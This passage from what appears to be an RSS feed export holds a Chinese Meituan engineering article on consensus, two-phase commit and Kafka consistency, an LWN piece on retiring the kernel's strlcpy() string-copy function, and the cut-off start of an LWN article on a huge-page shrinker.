我们可以实现线性化了吗——全序广播</h4><p>到此我们可以确认，有了Lamport时间戳，我们可以实现因果一致性了，但仍然无法实现线性化，因为我们还需要让这个全序通知到所有节点，否则可能就会无法做决策。\n举个例子，针对唯一用户名这样的场景，假设ABC同时向系统尝试注册相同的用户名，使用Lamport时间戳的做法是，在这三个并发请求中最先提交的返回成功，其他返回失败，但这里面我们因为有“上帝视角”，知道ABC，但实际请求本身在发送时不知道有其他请求存在（不同请求可能被发送到了不同的节点上）这样就需要系统做这个收集工作，这就需要有个类似协调者来不断询问各个节点是否有这样的请求，如果其中一个节点在询问过程中发生故障，那系统无法放心决定每个请求具体的RSP结果。所以最好是系统将这个顺序广播到各个节点，让各个节点真的知道这个顺序，这样可以直接做决策。</p><p>假设只有单核CPU，那么天然就是全序的，但是现在我们需要的是在多核、多机、分布式的情况下实现这个全序的广播，就存在这一些挑战。主要挑战是两个：</p><ul><li>多机</li><li>分布式</li></ul><p>对于多机，实际上实现全序广播最简单的实现方式使用主从模式的复制，让所有的操作顺序让主节点定义，然后按相同的顺序广播到各个从节点。对于分布式环境，需要处理部分失效问题，也就是如果主节点故障需要处理主成员变更。下面我们就来看看书中是怎么解决这个问题的。</p><p><strong>这里所谓的全序一般指的是分区内部的全序，而如果需要跨分区的全序，需要有额外的工作。</strong></p><p>对于全序广播，书中给了两条不变式：</p><ol><li>可靠发送：需要保证消息做到all-or-nothing的发送（想想上一章）。</li><li>严格有序：消息需要按完全相同的顺序发给各个节点。</li></ol><p><strong>实现层面</strong></p><p>我们对着上面的不变式来谈谈简单的实现思路，首先要做到可靠发送，这里有两层含义：</p><ol><li>消息不能丢</li><li>消息不能发一部分</li></ol><p>其中消息不能丢意味着如果某些节点出现故障后需要重试，如果需要安全的重试，那么广播操作本身失败后就不能对系统本身有副作用，否则就会导致消息发送到部分节点上的问题。上一章的事务的原子性恰好就解决的是这个问题，这里也就衍射出我们需要采用事务的一些思路，但与上面不同，这个场景是分布式系统，会发到多个节点，所以一定是分布式事务（耳熟能详的2PC一定少不了）。</p><p>另外一条是严格有序，实际上我们就是需要一个能保证顺序的数据结构，因为操作是按时间序的一个Append-only结构，恰好Log能解决这个问题，这里引出了另一个常会被提到的技术，复制状态机，这个概念是我在Raft的论文中看到的，假设初始值为a，如果按照相同的顺序执行操作ABCDE最后得到的一定是相同的结果。因此可以想象，全序广播最后的实现一定会用到Log这种数据结构。</p><h4>e.线性系统的实现</h4><p>现在假设我们已经有了全序广播，那么我们继续像我们的目标–线性化存储迈进，首先需要明确一个问题，线性化并不等价于全序广播，因为在分布式系统模型中我们通常采用异步模型或者半同步模型，这种模型对于全序关系何时成功发送到其他节点并没有明确的承诺，因此还需要再全序广播上做点什么才真正能实现线性化系统。</p><p>书中仍然举了唯一用户名的例子：可以采用线性化的CAS操作来实现，当用户创建用户名时当且仅当old值为空。实现这样的线性化CAS，直接采用全序广播+Log的方式。</p><ol><li>在日志中写入一条消息，表明想要注册的用户名。</li><li>读取日志，将其广播到所有节点并等待回复 （同步复制）。</li><li>如果表名第一次注册的回复来自当前节点，提交这条日志，并返回成功，否则如果这条回复来自其他节点，直接向客户端返回失败。</li></ol><p>而这些日志条目会以相同的顺序广播到所有节点，如果出现并发写入，就需要所有节点做决策，是否同意，以及同意哪一个节点对这个用户名的占用。以上我们就成功实现了一个对线性CAS的写入的线性一致性。然而对于读请求，由于采用异步更新日志的机制，客户端的读取可能会读到旧值，这可能需要一些额外的工作保证读取的线性化。</p><ol><li>线性化的方式获取当前最新消息的位置，即确保该位置之前的所有消息都已经读取到，然后再进行读取（ZK中的sync()）。</li><li>在日志中加入一条消息，收到回复时真正进行读取，这样消息在日志中的位置可以确定读取发生的时间点。</li><li>从保持同步更新的副本上读取数据。</li></ol><h3>4.7 共识</h3><p>上面我们在实现线性化系统时，实际上就有了一点点共识的苗头了，即需要多个节点对某个提议达成一致，并且一旦达成，不能被撤销。在现实中很多场景的问题都可以等价为共识问题：</p><ul><li>可线性化的CAS</li><li>原子事务提交</li><li>全序广播</li><li>分布式锁与租约</li><li>成员协调</li><li>唯一性约束</li></ul><p>实际上，为以上任何一个问题找到解决方案，都相当于实现了共识。</p><h4>两阶段提交</h4><h4>a. 实现</h4><p>书中直接以原子提交为切入点来聊共识。这里不过多说明，直接介绍两阶段提交，根据书中的描述，两阶段提交也算是一种共识算法，但实际上在现实中，我们更愿意把它当做实现更好共识算法的一个手段以及分布式事务的核心实现方法（Raft之类的共识算法实际上都有两阶段提交这个类似的语义）。</p><p><img src=\"https://p0.meituan.net/travelcube/dc35ea6168476d92d144dfad2663a226133857.png\" alt=\"图19 两阶段提交\" referrerpolicy=\"no-referrer\"></p><p>这个算法实际上比较朴素，就是两个阶段，有一个用于收集信息和做决策的协调者，然后经过朴素的两个阶段：</p><ol><li>协调者向参与者发送准备请求询问它们是否可以提交，如果参与者回答“是”则代表这个参与者一定会承诺提交这个消息或者事务。</li><li>如果协调者收到所有参与者的区确认信息，则第二阶段提交这个事务，否则如果有任意一方回答“否”则终止事务。</li></ol><p>这里一个看似非常简单的算法，平平无奇，无外乎比正常的提交多了个准备阶段，为什么说它就可以实现原子提交呢？这源于这个算法中的约定承诺，让我们继续拆细这个流程：</p><ol><li>当启动一个分布式事务时，会向协调者请求一个事务ID。</li><li>应用程序在每个参与节点上执行单节点事务，并将这个ID附加到操作上，这是读写操作都是单节点完成，如果发生问题，可以安全的终止（单节点事务保证）。</li><li>当应用准备提交时，协调者向所有参与者发送Prepare，如果这是有任何一个请求发生错误或超时，都会终止事务。</li><li>参与者收到请求后，将事务数据写入持久化存储，并检查是否有违规等，此时出现了第一个承诺：如果参与者向协调者发送了“是”意味着该参与者一定不会再撤回事务。</li><li>当协调者收到所有参与者的回复后，根据这些恢复做决策，如果收到全部赞成票，则将“提交”这个决议写入到自己本地的持久化存储，<strong>这里会出现第二个承诺：协调者一定会提交这个事务，直到成功</strong>。</li><li>假设提交过程出现异常，协调者需要不停重试，直到重试成功。</li></ol><p>正是由于上面的两个承诺保证了2PC能达成原子性，也是这个范式存在的意义所在。</p><h4>b.局限性</h4><ol><li>协调者要保存状态，因为协调者在决定提交之后需要担保一定要提交事务，因此它的决策一定需要持久化。</li><li>协调者是单点，那么如果协调者发生问题，并且无法恢复，系统此时完全不知道应该提交还是要回滚，就必须交由管理员来处理。</li><li>两阶段提交的准备阶段需要所有参与者都投赞成票才能继续提交，这样如果参与者过多，会导致事务失败概率很大。</li></ol><h4>更为朴素的共识算法定义</h4><p>看完了一个特例，书中总结了共识算法的几个特性：</p><ol><li><strong>协商一致性</strong>：所有节点都接受相同的提议。</li><li><strong>诚实性</strong>：所有节点一旦做出决定，不能反悔，不能对一项提议不能有两次不同的决议。</li><li><strong>合法性</strong>：如果决定了值v，这个v一定是从某个提议中得来的。</li><li><strong>可终止性</strong>：节点如果不崩溃一定能达成决议。</li></ol><p>如果我们用这几个特性对比2PC，实际上却是可以认为它算是个共识算法，不过这些并不太重要，我们重点还是看这些特性会对我们有什么样的启发。</p><p>前三个特性规定了安全性（Safety），如果没有容错的限制，直接人为指定个Strong Leader，由它来充当协调者，但就像2PC中的局限性一样，协调者出问题会导致系统无法继续向后执行，因此需要有额外的机制来处理这种变更（又要依赖共识），第四个特性则决定了活性（Liveness）之前的分型中说过，安全性需要优先保证，而活性的保证需要前提。这里书中直接给出结论，想让可终止性满足的前提是大多数节点正确运行。</p><h4>共识算法与全序广播</h4><p>实际在最终设计算法并落地时，并不是让每一条消息去按照上面4条特性来一次共识，而是直接采用全序广播的方式，全序广播承诺消息会按相同的顺序发送给各个节点，且有且仅有一次，这就相当于在做多轮共识，每一轮，节点提出他们下面要发送的消息，然后决定下一个消息的全序。使用全序广播实现共识的好处是能提供比单轮共识更高的效率（ZAB, Raft，Multi-paxos）。</p><h4>讨论</h4><p>这里面还有一些事情可以拿出来做一些讨论。首先，从实现的角度看，主从复制的模式特别适用于共识算法，但在之前介绍主从复制时，但光有主从复制模型对解决共识问题是不够的，主要有两点：</p><ol><li>主节点挂了如何确定新主</li><li>如何防止脑裂</li></ol><p>这两个问题实际上是再次用了共识解决。在共识算法中，实际上使用到了epoch来标识逻辑时间，例如Raft中的Term，Paxos中的Balletnumber，如果在选举后，有两个节点同时声称自己是主，那么拥有更新Epoch的节点当选。</p><p>同样的，在主节点做决策之前，也需要判断有没有更高Epoch的节点同时在进行决策，如果有，则代表可能发生冲突（Kafka中低版本只有Controller有这个标识，在后面的版本中，数据分区同样带上了类似的标识）。此时，节点不能仅根据自己的信息来决定任何事情，它需要收集Quorum节点中收集投票，主节点将提议发给所有节点，并等待Quorum节点的返回，并且需要确认没后更高Epoch的主节点存在时，节点才会对当前提议做投票。</p><p>详细看这里面涉及两轮投票，使用Quorum又是在使用所谓的重合，如果某个提议获得通过，那么投票的节点中一定参加过最近一轮主节点的选举。这可以得出，此时主节点并没有发生变化，可以安全的给这个主节点的提议投票。</p><p>另外，乍一看共识算法全都是好处，但看似好的东西背后一定有需要付出的代价：</p><ol><li>在达成一致性决议前，节点的投票是个同步复制，这会使得共识有丢消息的风险，需要在性能和线性一直间权衡（CAP）。</li><li>多数共识架设了一组固定的节点集，这意味着不能随意的动态变更成员，需要深入理解系统后才能做动态成员变更（可能有的系统就把成员变更外包了）。</li><li>共识对网络极度敏感，并且一般采用超时来做故障检测，可能会由于网络的抖动导致莫名的无效选主操作，甚至会让系统进入不可用状态。</li></ol><h4>外包共识</h4><p>虽然，可以根据上面的描述自己来实现共识算法，但成本可能是巨大的，最好的方式可能是将这个功能外包出去，用成熟的系统来实现共识，如果实在需要自己实现，也最好是用经过验证的算法来实现，不要自己天马行空。ZK和etcd等系统就提供了这样的服务，它们不仅自己通过共识实现了线性化存储，而且还对外提供共识的语义，我们可以依托这些系统来实现各种需求：</p><ol><li>线性化CAS</li><li>操作全序</li><li>故障检测</li><li>配置变更</li></ol><h3>4.8 本章小结</h3><p>本章花费了巨大力气讲解了分布式系统中的另一种一致性问题，内部一致性，这种问题主要是因为复制的滞后性产生，首先我们介绍了这种问题的起源，然后映射到分布式系统中，对不同一致性进行分类。</p><p>对于里面的强一致性，我们进行了详细的探讨，包括定义、使用场景以及实现等方面，并从中引出了像全序与偏序、因果关系的捕捉与定义（Lamport时间戳）、全序广播、2PC最后到共识，足以见得这种一致性解决起来的复杂性。</p><h2>5. 再谈分布式系统</h2><p>至此，我们从复制这一主题出发，讨论了分布式系统复制模型、挑战、事务以及共识等问题，这里结合两篇文章的内容，我尝试对分布式系统给出更细节的描述，首先描述特性和问题，然后给出特定的解决。</p><ul><li>与单机系统一样，分布式系统同样会有多个客户端同时对系统产生各种操作。每个操作所涉及的对象可能是一个，也可能是多个，这些客户端并发的操作可能会产生正确性问题。</li><li>为了实现容错，分布式系统的数据一般会有多个备份，不同副本之间通过复制实现。</li><li><p>常见复制模型包括：</p><ul><li>主从模式</li><li>多主模式</li><li>无主模式</li></ul></li><li><p>而从时效性和线性一致性出发，可分为：</p><ul><li>同步复制</li><li>异步复制</li></ul></li><li><p>异步复制可能存在滞后问题，会引发各种内部一致性问题。</p></li><li><p>分布式系统相比单机系统，具有两个独有的特点。</p><ul><li>部分失效</li><li>缺少全局时钟</li></ul></li></ul><p>面对这么多问题，如果一个理想的分布式数据系统，如果不考虑任何性能和其他的开销，我们期望实现的系统应该是这样的：</p><ol><li>整个系统的数据对外看起来只有一个副本，这样用户并不用担心更改某个状态时出现任何的不一致（线性一致性）。</li><li>整个系统好像只有一个客户端在操作，这样就不用担心和其他客户端并发操作时的各种冲突问题（串行化）。</li></ol><p>所以我们知道，线性一致性和串行化是两个正交的分支，分别表示外部一致性中的最高级别以及内部一致性的最高级别。如果真的实现这个，那么用户操作这个系统会非常轻松。但很遗憾，达成这两方面的最高级别都有非常大的代价，因此由着这两个分支衍生出各种的内部一致性和外部一致性。</p><p>用Jepsen官网对这两种一致性的定义来说，内部一致性约束的是单操作对单对象可能不同副本的操作需要满足时间全序，而外部一致性则约束了多操作对于多对象的操作。这类比于Java的并发编程，内部一致性类似于volatile变量或Atomic的变量用来约束实现多线程对同一个变量的操作，而外部一致性则是类似于synchronize或者AQS中的各种锁来保证多线程对于一个代码块（多个操作，多个对象）的访问符合程序员的预期。</p><p><img src=\"https://p0.meituan.net/travelcube/582f35c3dac4be4faba0800d4943638d474850.png\" alt=\"图20 一致性\" referrerpolicy=\"no-referrer\"></p><p>但是需要注意的是，在分布式系统中，这两种一致性也并非完全孤立，我们一般采用共识算法来实现线性一致，而在实现共识算法的过程中，同样可能涉及单个操作涉及多个对象的问题，因为分布式系统的操作，往往可能是作用在多个副本上的。也就是说，类似2PC这样的分布式事务同样会被用来解决共识问题（虽然书中把它也成为共识，但其实还是提供了一种类似事务原子性的操作），就像Java并发编程中，我们在synchronize方法中也可能会使用一些volatile变量一样。</p><p>而2PC不是分布式事务的全部，可能某些跨分区的事务同样需要用基于线性一致性的操作来满足对某个对象操作的一致性。也就是说想完整的实现分布式的系统，这两种一致性互相依赖，彼此互补，只有我们充分了解它们的核心作用，才能游刃有余地在实战中应用这些看似枯燥的名词。</p><h2>6. 士别三日，当刮目相看–再看Kafka</h2><p>了解完上面这些一致性，我们再回过头来看看Kafka的实复制，我们大致从复制模型、内部一致性、外部一致性等角度来看。Kafka中与复制模式相关的配置大致有下面几个：</p><ol><li>复制因子（副本数）</li><li>min.insync.replicas</li><li>acks</li></ol><p>用户首先通过配置acks先大体知道复制模式，如果ack=1或者0，则表示完全的异步复制；如果acks=all则代表完全的同步复制。而如果配置了异步复制，那么单分区实际上并不能保证线性一致性，因为异步复制的滞后性会导致一旦发生Leader变更可能丢失已经提交的消息，导致打破线性一致性的要求。</p><p>而如果选择ack=-1，则代表纯的同步复制，而此时如果没有min.insync.replicas的限制，那样会牺牲容错，多副本本来是用来做容错，结果则是有一个副本出问题系统就会牺牲掉Liveness。而min.insync.replicas参数给了用户做权衡的可能，一般如果我们要保证单分区线性一致性，需要满足多数节点正常工作，因此我们需要配置min.insync.replicas为majority。</p><p>而针对部分失效的处理，在实现复制时，kafka将成员变更进行了外包，对于数据节点而言，托管给Controller，直接由其指定一个新的主副本。而对于Controller节点本身，则将这个职责托管给了外部的线性存储ZK，利用ZK提供的锁于租约服务帮助实现共识以达成主节点选举，而在高版本中，Kafka去掉了外部的共识服务，而转而自己用共识算法实现Controller选主，同时元数据也由原来依赖ZK变为自主的Kraft实现的线性化存储进行自治。</p><p>而在外部一致性范畴，目前低版本Kafka并没有类似事务的功能，所以无法支持多对象的事务，而高版本中，增加了事务的实现（详见<a href=\"http://matt33.com/2018/11/04/kafka-transaction/\">blog</a>）。由于对象跨越多机，因此需要实现2PC，引入了TransactionCoordinator来承担协调者，参考上面2PC的基本流程。</p><p>一个大致的实现流程基本如下：首先向协调者获取事务ID（后文统称TID），然后向参与者发送请求准备提交，带上这个TID，参与者现在本地做append，如果成功返回，协调者持久化决策的内容，然后执行决策，参与者将消息真正写到Log中（更新LSO，与HW高水位区分）。但是上文也讲了2PC实际上是有一些问题的，首先2PC协调者的单点问题，Kafka的解决方法也比较简单，直接利用自己单分区同步复制保证线性一致性的特性，将协调者的状态存储在内部Topic中，然后当协调者崩溃时可以立刻做转移然后根据Topic做恢复，因为Topic本身就单分区而言就是个线性存储。</p><p>另外，就是2PC的协调者本质是个主从复制的过程，由于TransactionCoordinator本来就挂靠在Broker上，所以这个选举依然会委托给Controller，这样就解决了2PC中的比较棘手的问题。而对于事务的隔离级别，Kafka仅实现到了“读已提交（RC）”级别。</p><h2>7. 分布式系统验证框架</h2><p>在分布式领域有两把验证分布式算法的神器，其中一款是用于白盒建模的工具TLA+<a href=\"https://lamport.azurewebsites.net/tla/tla.html\">TLA Homepage</a>，对于TLA+，强烈推荐看一看Lamport老人家的视频教程<a href=\"https://www.bilibili.com/video/BV15a411A7k1/?spm_id_from=333.788.recommend_more_video.1&amp;vd_source=efafd41e8d4e8300dd4a3482b964cb9c\">视频教程（带翻译）</a>，或去看一看《Specifing Systems》。我们会知道，这个语言不光能定义分布式算法，应该说是可以定义整个计算机系统，如果掌握了使用数学定义系统的能力，可以让我们从代码细节中走出来，以状态机的思维来看待系统本身，我们可能会有不一样的感悟。TLA+的核心是通过数学中的集合论，数理逻辑和状态搜索来定义系统的行为。我们需要正确的对我们的系统或算法做抽象，给出形式化的规约，然后使用TLA+进行验证。</p><p>另一款则是黑盒<a href=\"https://jepsen.io/\">Jepsen Homepage</a>，其核心原理则是生成多个客户端对一个存储系统进行正常的读写操作并记录每次操作的结果，在测试中间引入故障，最后根据检测这些操作历史是否符合各种一致性所满足的规定。我们简单看下它的架构，然后本文将大致演示它的使用方法。</p><p><img src=\"https://p1.meituan.net/travelcube/2c9562ae17f11efd5e878cd95cf145e4126865.png\" alt=\"图21 Jepsen\" referrerpolicy=\"no-referrer\"></p><p>Jepsen主要有下面几个模块构成：</p><ol><li>DB Node（引擎本身的节点，存储节点）。</li><li>Control Node控制节点，负责生成客户端，生成操作，生成故障等，其与DB Node通常是SSH免密的。</li><li>Client客户端用于进行正常读写操作。</li><li>Generator用来生成计划。</li><li>Nemesis故障制造者。</li><li>Checker用来进行最后的一致性校验。</li></ol><p>我们团队使用Jepsen测试了Kafka系统的一致性，其中Kafka客户端与服务端的配置分别为：同步复制（ack=-1），3复制因子（副本数），最小可用副本为2（min.insync.isr）。在该配置下，Jepsen内置的故障注入最后均通过了验证。</p><h2>8. 小结</h2><p>我们的数据之旅到这里就要告一段落了，希望大家通过我的文章了解常见分布式系统的核心问题，以及面对这些问题所谓的事务，一致性和共识所能解决的问题和内在联系，能够在适当的时候合理的使用校验工具或框架对我们的系统的正确性和活性进行校验，这样就达到两篇系列文章的目的了。</p><p>分布式系统是个“大家伙”，希望今后能够跟大家一起继续努力，先将其“庖丁解牛”，然后再“逐个击破”，真正能够掌控一些比较复杂的分布式系统的设计。最后感谢团队中的小伙伴们，能将这样的思考系统化的产出，离不开组内良好的技术分享文化和浓厚的技术氛围，也欢迎大家加入美团技术团队。</p><h2>9. 作者简介</h2><p>仕禄，美团基础研发平台/数据科学与平台部工程师。</p>"
    },
    "origin": {
        "streamId": 13,
        "title": "美团技术团队",
        "htmlUrl": "https://tech.meituan.com/feed/",
        "feedUrl": "https://rsshub.black-desk.cn/meituan/tech/home"
    }
},
{
    "id": "905777",
    "timestampUsec": "1661915584087967",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Ushering out strlcpy()",
    "author": ";corbet",
    "published": 1661440620,
    "updated": 1661440620,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/905777/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jonathan Corbet</b><br>August 25, 2022\n           </div>\nWith all of the complex problems that must be solved in the kernel, one\nmight think that copying a string would draw little attention.  Even with\nthe hazards that C strings present, simply moving some bytes should not be\nall that hard.  But string-copy functions have been a frequent subject of\ndebate over the years, with different variants being in fashion at times.\nNow it seems that the BSD-derived <a href=\"https://man.openbsd.org/strlcpy.3\"><tt>strlcpy()</tt></a> function\nmay finally be on its way out of the kernel.\n<p>\nIn the beginning, copying strings in C was simple.\nYour editor's dog-eared, first-edition copy of <i>The C Programming\nLanguage</i> provides an implementation of <tt>strcpy()</tt> on page 101:\n</p><p>\n</p><pre>    strcpy(s, t)\n    char *s, *t;\n    {\n        while (*s++ = *t++)\n\t    ;\n    }\n</pre>\n<p>\nThis function has a few shortcomings, the most obvious of which is that\nit will overrun the destination buffer if the source string is too long.\nDevelopers working in C eventually concluded that this could be a problem,\nso other string-copying functions were developed, starting with <a href=\"https://man7.org/linux/man-pages/man3/strncpy.3p.html\"><tt>strncpy()</tt></a>:\n</p><p>\n</p><pre>    char *strncpy(char *dest, char *src, size_t n);\n</pre>\n<p>\nThis function will copy at most <tt>n</tt> bytes from <tt>src</tt> to\n<tt>dest</tt>, so, if <tt>n</tt> is no larger than the length of\n<tt>dest</tt>, then that array cannot be overrun.  <tt>strncpy()</tt> has a\ncouple of quirks, though.  It is defined to NUL-fill <tt>dest</tt> if\n<tt>src</tt> is shorter than <tt>n</tt>, so it ends up always writing the\nfull array.  If <tt>src</tt> is longer than <tt>n</tt>, then <tt>dest</tt>\nwill not be NUL-terminated at all — an invitation to trouble if the caller\ndoes not carefully check the return value.  That return value is <strike>the\naddress of the first NUL character written to <tt>dest</tt> unless\n<tt>src</tt> is too long, in which case <tt>strncpy()</tt> returns\n<tt>&amp;dest[n]</tt> — an address beyond the actual array</strike>\n<tt>dest</tt> regardless of whether truncation occurs or not.  As a result,\nchecking for truncation is a bit tricky and often not done.  [Thanks to\nRasmus Villemoes for pointing out the error in our earlier description of\nthe <tt>strncpy()</tt> return value.]\n</p><p>\n</p><h4><tt>strlcpy()</tt> and <tt>strscpy()</tt></h4>\n<p>\nThe BSD answer to the problems with <tt>strncpy()</tt> was to introduce a\nnew function called <tt>strlcpy()</tt>:\n</p><p>\n</p><pre>    size_t strlcpy(char *dest, const char *src, size_t n);\n</pre>\n<p>\nThis function, too, will copy a maximum of <tt>n</tt> bytes from\n<tt>src</tt> to <tt>dest</tt>; unlike <tt>strncpy()</tt>, it will always\nensure that <tt>dest</tt> is NUL-terminated.  The return value is always\nthe length of <tt>src</tt> regardless of whether it was truncated in the\ncopy or not; developers must compare the returned length against <tt>n</tt>\nto determine whether truncation has occurred.\n</p><p>\nThe first uses of <tt>strlcpy()</tt> in the kernel entered\nbriefly during the 2.4 stable series — sort of.  The media subsystem had a\ncouple of implementations defined as:\n</p><p>\n</p><pre>    #define strlcpy(dest,src,len) strncpy(dest,src,(len)-1)\n</pre>\n<p>\nAs one might imagine, there was not a lot of checking of return values\ngoing on at that point.  That macro disappeared relatively quickly,\nbut a real <tt>strlcpy()</tt> implementation appeared in the <a href=\"https://lore.kernel.org/lkml/Pine.LNX.4.44.0305261903330.2164-100000@home.transmeta.com/\">2.5.70\nrelease</a> in May 2003; that release also converted many callers in the\nkernel over to this new function.  Everything seemed good for quite some\ntime.\n</p><p>\nIn 2014, though, criticism of <tt>strlcpy()</tt> started to be heard,\nresulting in, among other things, an <a href=\"https://lwn.net/Articles/612244/\">extended\ndiscussion</a> over whether \nto add an implementation to the GNU C library; to this day, glibc lacks\n<tt>strlcpy()</tt>.  Kernel developers, too,\nstarted to feel disenchanted with this API.  In 2015, <a href=\"https://lwn.net/Articles/659214/\">yet another string-copy function</a> was added to\nthe kernel by Chris Metcalf:\n</p><p>\n</p><pre>    ssize_t strscpy(char *dest, const char *src, size_t count);\n</pre>\n<p>\nThis function, like the others, will copy <tt>src</tt> to <tt>dest</tt>\nwithout overrunning the latter.  Like <tt>strlcpy()</tt>, it ensures that\nthe result is NUL-terminated.  The difference is in the return value; it\nis the number of characters copied (without the trailing NUL byte) if the\nstring fits, and <tt>-E2BIG</tt> otherwise.\n</p><p>\n</p><h4>Reasons to like <tt>strscpy()</tt></h4>\n<p>\nWhy is <tt>strscpy()</tt> better?  One claimed advantage is the return\nvalue, which makes it easy to check whether the source string was truncated\nor not.  There are a few other points as well, though; to get into\nthose, it is instructive to look at <a href=\"https://elixir.bootlin.com/linux/v5.19.3/source/lib/string.c#L125\">the\nkernel's implementation of <tt>strlcpy()</tt></a>:\n</p><p>\n</p><pre>    size_t strlcpy(char *dest, const char *src, size_t size)\n    {\n\tsize_t ret = strlen(src);\n\n\tif (size) {\n\t    size_t len = (ret &gt;= size) ? size - 1 : ret;\n\t    memcpy(dest, src, len);\n\t    dest[len] = '\\0';\n\t}\n\treturn ret;\n    }\n</pre>\n<p>\n\nOne obvious shortcoming is that this function will read the entire source\nstring regardless of whether that data will be copied or not.  Given the\ndefined semantics of <tt>strlcpy()</tt>, this inefficiency simply cannot be\nfixed; there is no other way to return the length of the source string.\nThis is not just a question of efficiency, though; as recently <a href=\"https://lwn.net/ml/linux-kernel/CAHk-=wi+xbVq++uqW9YgWpHjyBHNB8a-xad+Xp23-B+eodLCEA@mail.gmail.com/\">pointed\nout</a> by Linus Torvalds, bad things can happen if the source\nstring is untrusted — which is one of the intended use cases for this\nfunction.  If <tt>src</tt> is not NUL-terminated, then <tt>strlcpy()</tt>\nwill continue merrily off the end until it <i>does</i> find a NUL byte,\nwhich may be way beyond the source array — if it doesn't crash first.\n</p><p>\nFinally, <tt>strlcpy()</tt> is subject to a race condition.  The length of\n<tt>src</tt> is calculated, then later used to perform the copy and\nreturned to the caller.  But if <tt>src</tt> changes in the middle, strange\nthings could happen; at best the return value will not match what is\nactually in the <tt>dest</tt> string.  This problem is specific to the\nimplementation rather \nthan the definition, and could thus be fixed, but nobody seems to think\nit's worth the effort.\n</p><p>\nThe <a href=\"https://elixir.bootlin.com/linux/v5.19.3/source/lib/string.c#L151\">implementation\nof <tt>strscpy()</tt></a> avoids all of these problems and is also more\nefficient.  It is also rather more complex as a result, of course.\n</p><p>\n</p><h4>The end of <tt>strlcpy()</tt> in the kernel?</h4>\n<p>\nWhen <tt>strlcpy()</tt> was first introduced, the intent was to replace\nall of the <tt>strncpy()</tt> calls in the kernel and get rid of the latter\nfunction altogether.  In the 6.0-rc2 kernel, though, there are still nearly\n900 <tt>strncpy()</tt> call sites remaining; that number grew by two in the\n6.0 merge window.  At the introduction of <tt>strscpy()</tt>, instead,\nTorvalds explicitly <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=30c44659f4a3e7e1f9f47e895591b4b40bf62671\">did\nnot want</a> to see any sort of mass conversion of <tt>strlcpy()</tt>\ncalls.  In 6.0-rc2, there are just over 1,400 <tt>strlcpy()</tt> calls and\nnearly 1,800 <tt>strscpy()</tt> calls.\n</p><p>\nNearly seven years later, the attitude seems to have changed a bit;\nTorvalds now says that \"<q>strlcpy() does need to go</q>\".  A number of\nsubsystems have made conversion passes, and the number of\n<tt>strlcpy()</tt> call sites has fallen by 85 since 5.19.  Whether it will\never be possible to remove <tt>strlcpy()</tt> entirely is unclear;\n<tt>strncpy()</tt> is still holding strong despite its known hazards and a\ndecision to get rid of it nearly 20 years ago.  Once something gets\ninto the kernel, taking it out again can be a difficult process.\n</p><p>\nThere may be hope, though, in this case.  As Torvalds <a href=\"https://lwn.net/ml/linux-kernel/CAHk-%3DwjGmhaE-Y8GqWKPtWYOi%3DbOarFgo7UkzHNoOVEKnkXXrQ%40mail.gmail.com/\">observed</a>\nin response to a set of conversions from Wolfram Sang, most of the callers to\n<tt>strlcpy()</tt> never use the return value; those could all be converted\nto <tt>strscpy()</tt> with no change in behavior.  All that would be needed, he\nsuggested, was for somebody to create a <a href=\"https://coccinelle.gitlabpages.inria.fr/website/\">Coccinelle</a>\nscript to do the work.  Sang <a href=\"https://lwn.net/ml/linux-kernel/YvhXzarjOLEJ8nsW@shikoro/\">rose to the challenge</a>\nand has created <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/wsa/linux.git/log/?h=renesas/strlcpy\">a\nbranch with the conversions done</a>.  That work, obviously, \nwon't be considered for 6.0, but might show up in a 6.1 pull request.\n</p><p>\nThat would leave relatively few <tt>strlcpy()</tt> users in the kernel.\nThose could be cleaned up one by one, and it might just be possible to get\nrid of <tt>strlcpy()</tt> entirely.  That would end a 20-year sporadic\ndiscussion on the best way to do bounded string copies in the kernel — all\nof those remaining <tt>strncpy()</tt> calls notwithstanding — at\nleast until some clever developer comes up an even better function and\nstarts the whole process anew.<br clear=\"all\"></p><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#String_processing\">String processing</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "906511",
    "timestampUsec": "1662666185934121",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "The transparent huge page shrinker",
    "author": ";corbet",
    "published": 1662661500,
    "updated": 1662661500,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/906511/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jonathan Corbet</b><br>September 8, 2022\n           </div>\nHuge pages are a mechanism implemented by the CPU that allows the management\nof memory in larger chunks.  Use of huge pages can increase performance\nsignificantly, which is why the kernel has a \"transparent huge page\"\nmechanism to try to create them when possible.  But a huge page will only\nbe helpful if most of the memory contained within it is actually in use;\notherwise it is just an expensive waste of memory.  <a href=\"https://lwn.net/ml/linux-kernel/cover.1661461643.git.alexlzhu@fb.com/\">This patch\nset</a> from Alexander Zhu implements a mechanism to detect underutilized\nhuge pages and recover that wasted memory for other uses.\n<p>\nThe base page size on most systems running Linux is 4,096 bytes, a number\nwhich has remained unchanged for many years even as the amount of memory\ninstalled in those systems has grown.  By grouping (typically) 512\nphysically contiguous base pages into a huge page, it is possible to reduce\nthe overhead of managing those pages.  More importantly, though, huge pages\ntake far fewer of the processor's scarce translation lookaside buffer (TLB)\nslots, which cache the results of virtual-to-physical address translations.\nTLB misses can be quite expensive, so expanding the amount of memory that\ncan be covered by the TLB (as huge pages do) can improve performance\nsignificantly.\n</p><p>\nThe downside of huge pages (as with larger page sizes in general) is\ninternal fragmentation.  If only part of a huge page is actually being\nused, the rest is wasted memory that cannot be used for any other purpose.\nSince such a page contains little useful memory, 